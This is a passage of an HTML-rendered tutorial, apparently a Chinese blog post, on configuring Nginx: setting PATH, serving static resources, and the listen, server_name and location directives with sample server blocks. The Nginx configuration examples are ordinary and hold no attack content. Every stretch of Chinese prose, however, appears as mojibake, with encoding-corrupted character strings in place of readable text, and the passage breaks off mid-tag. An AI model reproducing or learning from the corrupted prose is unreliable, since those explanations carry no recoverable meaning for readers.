/etc/profile<br>åœ¨æœ€åä¸€è¡Œæ·»åŠ <br>export <span class="hljs-title class_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/local/nginx/sbin</span><br></code></pre></td></tr></table></figure><p>(2)ä½¿ä¹‹ç«‹å³ç”Ÿæ•ˆ</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br></code></pre></td></tr></table></figure><p>(3)æ‰§è¡Œnginxå‘½ä»¤</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -V</span><br></code></pre></td></tr></table></figure><h2 id="nginxé™æ€èµ„æºéƒ¨ç½²"><a class="markdownIt-Anchor" href="#nginxé™æ€èµ„æºéƒ¨ç½²"></a> Nginxé™æ€èµ„æºéƒ¨ç½²</h2><h3 id="nginxé™æ€èµ„æºæ¦‚è¿°"><a class="markdownIt-Anchor" href="#nginxé™æ€èµ„æºæ¦‚è¿°"></a> Nginxé™æ€èµ„æºæ¦‚è¿°</h3><p>ä¸Šç½‘å»æœç´¢è®¿é—®èµ„æºå¯¹äºæˆ‘ä»¬æ¥è¯´å¹¶ä¸é™Œç”Ÿï¼Œé€šè¿‡æµè§ˆå™¨å‘é€ä¸€ä¸ªHTTPè¯·æ±‚å®ç°ä»å®¢æˆ·ç«¯å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ç«¯è·å–æ‰€éœ€è¦å†…å®¹åå¹¶æŠŠå†…å®¹å›æ˜¾å±•ç¤ºåœ¨é¡µé¢çš„ä¸€ä¸ªè¿‡ç¨‹ã€‚è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æ‰€è¯· æ±‚çš„å†…å®¹å°±åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œä¸€ç±»æ˜¯é™æ€èµ„æºã€ä¸€ç±»æ˜¯åŠ¨æ€èµ„æºã€‚<br />é™æ€èµ„æºå³æŒ‡åœ¨æœåŠ¡å™¨ç«¯çœŸå®å­˜åœ¨å¹¶ä¸”èƒ½ç›´æ¥æ‹¿æ¥å±•ç¤ºçš„ä¸€äº›æ–‡ä»¶ï¼Œæ¯”å¦‚å¸¸è§çš„htmlé¡µé¢ã€cssæ–‡ä»¶ã€jsæ–‡ä»¶ã€å›¾ ç‰‡ã€è§†é¢‘ç­‰èµ„æºï¼›<br />åŠ¨æ€èµ„æºå³æŒ‡åœ¨æœåŠ¡å™¨ç«¯çœŸå®å­˜åœ¨ä½†æ˜¯è¦æƒ³è·å–éœ€è¦ç»è¿‡ä¸€å®šçš„ä¸šåŠ¡é€»è¾‘å¤„ç†ï¼Œæ ¹æ®ä¸åŒçš„æ¡ä»¶å±•ç¤ºåœ¨é¡µé¢ä¸åŒè¿™ ä¸€éƒ¨åˆ†å†…å®¹ï¼Œæ¯”å¦‚è¯´æŠ¥è¡¨æ•°æ®å±•ç¤ºã€æ ¹æ®å½“å‰ç™»å½•ç”¨æˆ·å±•ç¤ºç›¸å…³å…·ä½“æ•°æ®ç­‰èµ„æºï¼›</p><p>Nginxå¤„ç†é™æ€èµ„æºçš„å†…å®¹ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘ä¸‹é¢è¿™å‡ ä¸ªé—®é¢˜ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">ï¼ˆ1ï¼‰é™æ€èµ„æºçš„é…ç½®æŒ‡ä»¤<br>ï¼ˆ2ï¼‰é™æ€èµ„æºçš„é…ç½®ä¼˜åŒ–<br>ï¼ˆ3ï¼‰é™æ€èµ„æºçš„å‹ç¼©é…ç½®æŒ‡ä»¤<br>ï¼ˆ4ï¼‰é™æ€èµ„æºçš„ç¼“å­˜å¤„ç†<br>ï¼ˆ5ï¼‰é™æ€èµ„æºçš„è®¿é—®æ§åˆ¶ï¼ŒåŒ…æ‹¬è·¨åŸŸé—®é¢˜å’Œé˜²ç›—é“¾é—®é¢˜<br></code></pre></td></tr></table></figure><h3 id="nginxé™æ€èµ„æºçš„é…ç½®æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#nginxé™æ€èµ„æºçš„é…ç½®æŒ‡ä»¤"></a> Nginxé™æ€èµ„æºçš„é…ç½®æŒ‡ä»¤</h3><h4 id="listenæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#listenæŒ‡ä»¤"></a> listenæŒ‡ä»¤</h4><p>listen:ç”¨æ¥é…ç½®ç›‘å¬ç«¯å£ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>listen address[:port] [default_server]â€¦;<br/>listen port [default_server]â€¦;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>listen *:80 | *:8000</td></tr><tr><td>ä½ç½®</td><td>server</td></tr></tbody></table><p>listençš„è®¾ç½®æ¯”è¾ƒçµæ´»ï¼Œæˆ‘ä»¬é€šè¿‡å‡ ä¸ªä¾‹å­æ¥æŠŠå¸¸ç”¨çš„è®¾ç½®æ–¹å¼ç†Ÿæ‚‰ä¸‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">listen</span> <span class="hljs-number">127.0.0.1:8000</span>; // listen localhost:<span class="hljs-number">8000</span> ç›‘å¬æŒ‡å®šçš„IPå’Œç«¯å£<br><span class="hljs-attribute">listen</span> <span class="hljs-number">127.0.0.1</span>;ç›‘å¬æŒ‡å®šIPçš„æ‰€æœ‰ç«¯å£<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8000</span>;ç›‘å¬æŒ‡å®šç«¯å£ä¸Šçš„è¿æ¥<br><span class="hljs-attribute">listen</span> *:<span class="hljs-number">8000</span>;ç›‘å¬æŒ‡å®šç«¯å£ä¸Šçš„è¿æ¥<br></code></pre></td></tr></table></figure><p>default_serverå±æ€§æ˜¯æ ‡è¯†ç¬¦ï¼Œç”¨æ¥å°†æ­¤è™šæ‹Ÿä¸»æœºè®¾ç½®æˆé»˜è®¤ä¸»æœºã€‚æ‰€è°“çš„é»˜è®¤ä¸»æœºæŒ‡çš„æ˜¯å¦‚æœæ²¡æœ‰åŒ¹é…åˆ°å¯¹åº”çš„address:portï¼Œåˆ™ä¼šé»˜è®¤æ‰§è¡Œçš„ã€‚å¦‚æœä¸æŒ‡å®šé»˜è®¤ä½¿ç”¨çš„æ˜¯ç¬¬ä¸€ä¸ªserverã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8080</span>;<br>server_name <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br><span class="hljs-keyword">location</span> /&#123;<br>root html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html;<br>&#125;<br>&#125;<br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8080</span> default_server;<br>server_name localhost;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">444</span> <span class="hljs-string">&#x27;This is a error request&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="server_nameæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#server_nameæŒ‡ä»¤"></a> server_nameæŒ‡ä»¤</h4><p>server_nameï¼šç”¨æ¥è®¾ç½®è™šæ‹Ÿä¸»æœºæœåŠ¡åç§°ã€‚</p><p>127.0.0.1 ã€ localhost ã€åŸŸå[<a href="http://www.baidu.com">www.baidu.com</a> | <a href="http://www.jd.com">www.jd.com</a>]</p><table><thead><tr><th>è¯­æ³•</th><th>server_name  name â€¦;<br/>nameå¯ä»¥æä¾›å¤šä¸ªä¸­é—´ç”¨ç©ºæ ¼åˆ†éš”</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>server_name  â€œâ€;</td></tr><tr><td>ä½ç½®</td><td>server</td></tr></tbody></table><p>å…³äºserver_nameçš„é…ç½®æ–¹å¼æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">ç²¾ç¡®åŒ¹é…<br>é€šé…ç¬¦åŒ¹é…<br>æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…<br></code></pre></td></tr></table></figure><p>é…ç½®æ–¹å¼ä¸€ï¼šç²¾ç¡®åŒ¹é…</p><p>å¦‚ï¼š</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lasso">server &#123;<br>listen <span class="hljs-number">80</span>;<br>server_name www.itcast.<span class="hljs-literal">cn</span> www.itheima.<span class="hljs-literal">cn</span>;<br><span class="hljs-params">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¡¥å……å°çŸ¥è¯†ç‚¹:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">hosts</span>æ˜¯ä¸€ä¸ªæ²¡æœ‰æ‰©å±•åçš„ç³»ç»Ÿæ–‡ä»¶ï¼Œå¯ä»¥ç”¨è®°äº‹æœ¬ç­‰å·¥å…·æ‰“å¼€ï¼Œå…¶ä½œç”¨å°±æ˜¯å°†ä¸€äº›å¸¸ç”¨çš„ç½‘å€åŸŸåä¸å…¶å¯¹åº”çš„<span class="hljs-built_in">IP</span>åœ°å€å»ºç«‹ä¸€ä¸ªå…³è”â€œæ•°æ®åº“â€ï¼Œå½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘å€æ—¶ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä»hostsæ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„<span class="hljs-built_in">IP</span>åœ°å€ï¼Œä¸€æ—¦æ‰¾åˆ°ï¼Œç³»ç»Ÿä¼šç«‹å³æ‰“å¼€å¯¹åº”ç½‘é¡µï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ç³»ç»Ÿä¼šå†å°†ç½‘å€æäº¤DNSåŸŸåè§£ææœåŠ¡å™¨è¿›è¡Œ<span class="hljs-built_in">IP</span>åœ°å€çš„è§£æã€‚<br></code></pre></td></tr></table></figure><p>windows:C:\Windows\System32\drivers\etc</p><p>centosï¼š/etc/hosts</p><p>å› ä¸ºåŸŸåæ˜¯è¦æ”¶å–ä¸€å®šçš„è´¹ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¿®æ”¹hostsæ–‡ä»¶æ¥åˆ¶ä½œä¸€äº›è™šæ‹ŸåŸŸåæ¥ä½¿ç”¨ã€‚éœ€è¦ä¿®æ”¹ <code>/etc/hosts</code>æ–‡ä»¶æ¥æ·»åŠ </p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">vim /etc/hosts<br><span class="hljs-number">127.0.0.1</span> www.itcast.cn<br><span class="hljs-number">127.0.0.1</span> www.itheima.cn<br></code></pre></td></tr></table></figure><p>é…ç½®æ–¹å¼äºŒ:ä½¿ç”¨é€šé…ç¬¦é…ç½®</p><p>server_nameä¸­æ”¯æŒé€šé…ç¬¦&quot;*&quot;,ä½†éœ€è¦æ³¨æ„çš„æ˜¯é€šé…ç¬¦ä¸èƒ½å‡ºç°åœ¨åŸŸåçš„ä¸­é—´ï¼Œåªèƒ½å‡ºç°åœ¨é¦–æ®µæˆ–å°¾æ®µï¼Œå¦‚ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">server &#123;<br>listen 80;<br>server_name  *<span class="hljs-string">.itcast.cn</span>www.itheima.*;<br><span class="hljs-comment"># www.itcast.cn abc.itcast.cn www.itheima.cn www.itheima.com</span><br><span class="hljs-string">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢çš„é…ç½®å°±ä¼šæŠ¥é”™</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span>  <span class="hljs-regexp">www.*</span>.cn www.itheima.c*<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½®ä¸‰:ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼é…ç½®</p><p>server_nameä¸­å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¹¶ä¸”ä½¿ç”¨<code>~</code>ä½œä¸ºæ­£åˆ™è¡¨è¾¾å¼å­—ç¬¦ä¸²çš„å¼€å§‹æ ‡è®°ã€‚</p><p>å¸¸è§çš„æ­£åˆ™è¡¨è¾¾å¼</p><table><thead><tr><th>ä»£ç </th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>^</td><td>åŒ¹é…æœç´¢å­—ç¬¦ä¸²å¼€å§‹ä½ç½®</td></tr><tr><td>$</td><td>åŒ¹é…æœç´¢å­—ç¬¦ä¸²ç»“æŸä½ç½®</td></tr><tr><td>.</td><td>åŒ¹é…é™¤æ¢è¡Œç¬¦\nä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦</td></tr><tr><td>\</td><td>è½¬ä¹‰å­—ç¬¦ï¼Œå°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºç‰¹æ®Šå­—ç¬¦</td></tr><tr><td>[xyz]</td><td>å­—ç¬¦é›†ï¼Œä¸ä»»æ„ä¸€ä¸ªæŒ‡å®šå­—ç¬¦åŒ¹é…</td></tr><tr><td>[a-z]</td><td>å­—ç¬¦èŒƒå›´ï¼ŒåŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»ä½•å­—ç¬¦</td></tr><tr><td>\w</td><td>ä¸ä»¥ä¸‹ä»»æ„å­—ç¬¦åŒ¹é… A-Z a-z 0-9 å’Œä¸‹åˆ’çº¿,ç­‰æ•ˆäº[A-Za-z0-9_]</td></tr><tr><td>\d</td><td>æ•°å­—å­—ç¬¦åŒ¹é…ï¼Œç­‰æ•ˆäº[0-9]</td></tr><tr><td>{n}</td><td>æ­£å¥½åŒ¹é…næ¬¡</td></tr><tr><td>{n,}</td><td>è‡³å°‘åŒ¹é…næ¬¡</td></tr><tr><td>{n,m}</td><td>åŒ¹é…è‡³å°‘næ¬¡è‡³å¤šmæ¬¡</td></tr><tr><td>*</td><td>é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œç­‰æ•ˆäº{0,}</td></tr><tr><td>+</td><td>ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œç­‰æ•ˆäº{1,}</td></tr><tr><td>?</td><td>é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œç­‰æ•ˆäº{0,1}</td></tr></tbody></table><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br>        <span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>        server_name ~^www\.(\w+)\.com$;<br>        default_type <span class="hljs-type">text</span>/plain;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-meta">$1</span>  <span class="hljs-meta">$2</span> ..;<br>&#125;<br>æ³¨æ„ ~åé¢ä¸èƒ½åŠ ç©ºæ ¼ï¼Œæ‹¬å·å¯ä»¥å–å€¼<br></code></pre></td></tr></table></figure><h5 id="åŒ¹é…æ‰§è¡Œé¡ºåº"><a class="markdownIt-Anchor" href="#åŒ¹é…æ‰§è¡Œé¡ºåº"></a> åŒ¹é…æ‰§è¡Œé¡ºåº</h5><p>ç”±äºserver_nameæŒ‡ä»¤æ”¯æŒé€šé…ç¬¦å’Œæ­£åˆ™è¡¨è¾¾å¼ï¼Œå› æ­¤åœ¨åŒ…å«å¤šä¸ªè™šæ‹Ÿä¸»æœºçš„é…ç½®æ–‡ä»¶ä¸­ï¼Œå¯èƒ½ä¼šå‡ºç°ä¸€ä¸ªåç§°è¢«å¤šä¸ªè™šæ‹Ÿä¸»æœºçš„server_nameåŒ¹é…æˆåŠŸï¼Œå½“é‡åˆ°è¿™ç§æƒ…å†µï¼Œå½“å‰çš„è¯·æ±‚äº¤ç»™è°æ¥å¤„ç†å‘¢ï¼Ÿ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name ~^www\.\w+\.com$;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;regex_success&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name www.itheima.*;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;wildcard_after_success&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name *.itheima.com;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;wildcard_before_success&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name www.itheima.com;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;exact_success&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span> default_server;<br>server_name _;<br>default_type <span class="hljs-type">text</span>/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">444</span> <span class="hljs-string">&#x27;default_server not found server&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“è®ºï¼š</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">exact_success<br>wildcard_before_success<br>wildcard_after_success<br>regex_success<br>default_server not found server!!<br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">No1:</span>å‡†ç¡®åŒ¹é…server_name<br><br><span class="hljs-symbol">No2:</span>é€šé…ç¬¦åœ¨å¼€å§‹æ—¶åŒ¹é…server_nameæˆåŠŸ<br><br><span class="hljs-symbol">No3:</span>é€šé…ç¬¦åœ¨ç»“æŸæ—¶åŒ¹é…server_nameæˆåŠŸ<br><br><span class="hljs-symbol">No4:</span>æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…server_nameæˆåŠŸ<br><br><span class="hljs-symbol">No5:</span>è¢«é»˜è®¤çš„default_serverå¤„ç†ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šé»˜è®¤æ‰¾ç¬¬ä¸€ä¸ªserver<br></code></pre></td></tr></table></figure><h4 id="locationæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#locationæŒ‡ä»¤"></a> locationæŒ‡ä»¤</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">server&#123;<br>listen <span class="hljs-number">80</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title"></span><br><span class="hljs-title">&#125;</span><br><span class="hljs-title">location</span> /abc&#123;<br><br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>location:ç”¨æ¥è®¾ç½®è¯·æ±‚çš„URI</p><table><thead><tr><th>è¯­æ³•</th><th>location [  =  |   ~  |  ~*   |   ^~   |@ ] uri{â€¦}</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>server,location</td></tr></tbody></table><p>uriå˜é‡æ˜¯å¾…åŒ¹é…çš„è¯·æ±‚å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä¸åŒ…å«æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥åŒ…å«æ­£åˆ™è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆnginxæœåŠ¡å™¨åœ¨æœç´¢åŒ¹é…locationçš„æ—¶å€™ï¼Œæ˜¯å…ˆä½¿ç”¨ä¸åŒ…å«æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œæ‰¾åˆ°ä¸€ä¸ªåŒ¹é…åº¦æœ€é«˜çš„ä¸€ä¸ªï¼Œç„¶ååœ¨é€šè¿‡åŒ…å«æ­£åˆ™è¡¨è¾¾å¼çš„è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœèƒ½åŒ¹é…åˆ°ç›´æ¥è®¿é—®ï¼ŒåŒ¹é…ä¸åˆ°ï¼Œå°±ä½¿ç”¨åˆšæ‰åŒ¹é…åº¦æœ€é«˜çš„é‚£ä¸ªlocationæ¥å¤„ç†è¯·æ±‚ã€‚</p><p>å±æ€§ä»‹ç»:</p><p>ä¸å¸¦ç¬¦å·ï¼Œè¦æ±‚å¿…é¡»ä»¥æŒ‡å®šæ¨¡å¼å¼€å§‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>listen <span class="hljs-number">80</span>;<br>server_name <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;<br>location /abc&#123;<br>default_type text/plain;<br>return <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success&quot;</span>;<br>&#125;<br>&#125;<br>ä»¥ä¸‹è®¿é—®éƒ½æ˜¯æ­£ç¡®çš„<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abc<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abc?p1=TOM<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span><span class="hljs-regexp">/abc/</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abcdef<br></code></pre></td></tr></table></figure><p>= :  ç”¨äºä¸åŒ…å«æ­£åˆ™è¡¨è¾¾å¼çš„uriå‰ï¼Œå¿…é¡»ä¸æŒ‡å®šçš„æ¨¡å¼ç²¾ç¡®åŒ¹é…</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>listen <span class="hljs-number">80</span>;<br>server_name <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;<br>location =/abc&#123;<br>default_type text/plain;<br>return <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success&quot;</span>;<br>&#125;<br>&#125;<br>å¯ä»¥åŒ¹é…åˆ°<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abc<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abc?p1=TOM<br>åŒ¹é…ä¸åˆ°<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span><span class="hljs-regexp">/abc/</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abcdef<br></code></pre></td></tr></table></figure><p>~ ï¼š ç”¨äºè¡¨ç¤ºå½“å‰uriä¸­åŒ…å«äº†æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¹¶ä¸”åŒºåˆ†å¤§å°å†™<br />~*:  ç”¨äºè¡¨ç¤ºå½“å‰uriä¸­åŒ…å«äº†æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¹¶ä¸”ä¸åŒºåˆ†å¤§å°å†™</p><blockquote><p>åŒæ—¶ä½¿ç”¨çš„è¯ï¼ŒåªåŒ¹é…åœ¨.confå†™åœ¨å‰é¢çš„ä¸€ç§</p></blockquote><p>æ¢å¥è¯è¯´ï¼Œå¦‚æœuriåŒ…å«äº†æ­£åˆ™è¡¨è¾¾å¼ï¼Œéœ€è¦ç”¨ä¸Šè¿°ä¸¤ä¸ªç¬¦åˆæ¥æ ‡è¯†</p><p>^~: ç”¨äºä¸åŒ…å«æ­£åˆ™è¡¨è¾¾å¼çš„uriå‰ï¼ŒåŠŸèƒ½å’Œä¸åŠ ç¬¦å·çš„ä¸€è‡´ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå¦‚æœæ¨¡å¼åŒ¹é…ï¼Œé‚£ä¹ˆå°±åœæ­¢æœç´¢å…¶ä»–æ¨¡å¼äº†ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39001</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span> <span class="hljs-regexp">~* ^/abc\w$</span> &#123;<br>           <span class="hljs-attribute">default_type</span> text/plain;<br>           <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success~*&quot;</span>;<br>       &#125;<br>       <br>            <br>        <span class="hljs-section">location</span> <span 